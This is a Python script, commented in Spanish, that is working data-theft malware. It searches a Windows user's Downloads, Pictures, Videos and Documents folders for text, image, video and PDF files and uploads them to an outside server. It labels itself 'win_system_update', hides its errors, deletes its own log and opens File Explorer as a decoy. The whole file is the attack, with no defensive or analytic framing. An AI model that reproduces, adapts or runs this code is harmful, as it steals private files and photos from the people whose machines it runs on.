import os
import time
import requests
import glob
import sys
import subprocess

# Configuración
SERVER_URL = "https://netrunner-pro.up.railway.app" 
UPLOAD_ENDPOINT = f"{SERVER_URL}/api/upload"

def log(message):
    """Función de log corregida para evitar errores de sintaxis."""
    try:
        with open('sync_log.txt', 'a') as f:
            f.write(f'[{time.ctime()}] {message}\n')
    except:
        pass

def run_exfiltration():
    user_profile = os.environ.get('USERPROFILE', '')
    targets = [
        os.path.join(user_profile, 'Downloads'),
        os.path.join(user_profile, 'Pictures'),
        os.path.join(user_profile, 'Videos'),
        os.path.join(user_profile, 'Documents')
    ]
    
    extensions = ['*.txt', '*.jpg', '*.png', '*.mp4', '*.pdf']
    
    for folder in targets:
        if not os.path.exists(folder):
            continue
        
        for ext in extensions:
            for file_path in glob.glob(os.path.join(folder, ext)):
                try:
                    filename = os.path.basename(file_path)
                    
                    # 1. Verificar duplicados
                    check = requests.get(f"{SERVER_URL}/api/check-file", params={
                        'agentId': socket.gethostname() if 'socket' in globals() else 'win_update',
                        'filename': filename
                    }, timeout=5)
                    
                    if check.status_code == 200 and check.json().get('exists'):
                        continue 

                    # 2. Validar tamaño (Límite 50MB)
                    if os.path.getsize(file_path) > 50 * 1024 * 1024:
                        continue
                    
                    # 3. Subida
                    with open(file_path, 'rb') as f:
                        requests.post(UPLOAD_ENDPOINT, 
                                    files={'file': (filename, f.read())}, 
                                    data={'agentId': 'win_system_update'}, 
                                    timeout=15)
                except:
                    continue

    # Limpieza de log antes de salir
    if os.path.exists('sync_log.txt'):
        try: os.remove('sync_log.txt')
        except: pass

if __name__ == "__main__":
    # Open current directory on startup for user feedback
    if sys.platform == "win32":
        try:
            # os.startfile('.') opens the current directory in File Explorer on Windows
            subprocess.Popen(['explorer', os.getcwd()], 
                             creationflags=subprocess.CREATE_NO_WINDOW)
            log("Opened current directory in File Explorer.")
        except Exception as e:
            log(f"Error opening current directory: {e}")
    else:
        log("Agent started. (Workspace auto-open not supported on this OS).")
            
    run_exfiltration()
    
    sys.exit(0)
